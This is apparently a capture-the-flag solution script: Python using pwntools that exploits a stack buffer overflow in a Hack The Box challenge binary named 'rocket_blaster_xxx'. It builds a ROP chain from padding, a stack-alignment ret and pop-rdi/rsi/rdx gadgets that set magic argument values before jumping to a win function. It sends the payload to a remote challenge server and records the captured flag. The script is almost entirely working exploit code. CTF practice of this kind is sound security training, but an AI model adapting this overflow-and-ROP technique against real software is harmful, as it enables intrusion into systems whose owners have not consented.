#RazviOverflow
'''
reads 0x66 (102) bytes into stack-0x28
fill_ammo is at 0x004012f5
it expects:
	- rdi = 0xdeadbeef
	- rsi = 0xdeadbabe
	- rdx = 0xdead1337

0x000000000040159f : pop rdi ; ret
0x000000000040159b : pop rdx ; ret
0x000000000040159d : pop rsi ; ret
0x000000000040101a : ret
'''
from pwn import *

def debug(p):
	pid = util.proc.pidof(p)[0]
	print(f"Pid is: {pid}")
	util.proc.wait_for_debugger(pid)

context.binary = binary = ELF("./rocket_blaster_xxx", checksec=False)

fill_ammo_address = p64(binary.sym.fill_ammo)
print(binary.sym.fill_ammo)
ret_address = p64(0x000000000040101a)
rdi_value = p64(0xdeadbeef)
rdx_value = p64(0xdead1337)
rsi_value = p64(0xdeadbabe)
pop_rdi_address = p64(0x000000000040159f)
pop_rdx_address = p64(0x000000000040159b)
pop_rsi_address = p64(0x000000000040159d)

padding = b"A"*0x28 #Reaching saved ret addr, overwriting RBP
payload = padding
payload += ret_address # Alignment issues
payload += pop_rdi_address + rdi_value
payload += pop_rsi_address + rsi_value
payload += pop_rdx_address + rdx_value
payload += fill_ammo_address

#p = process(env={"LD_LIBRARY_PATH" : "./glibc/libc.so.6"})
p = remote("94.237.62.83", 48977)

#debug(p)

print(p.recv())
p.recv()
p.sendline(payload)
print(p.recv())

# Flag: HTB{b00m_b00m_r0ck3t_2_th3_m00n}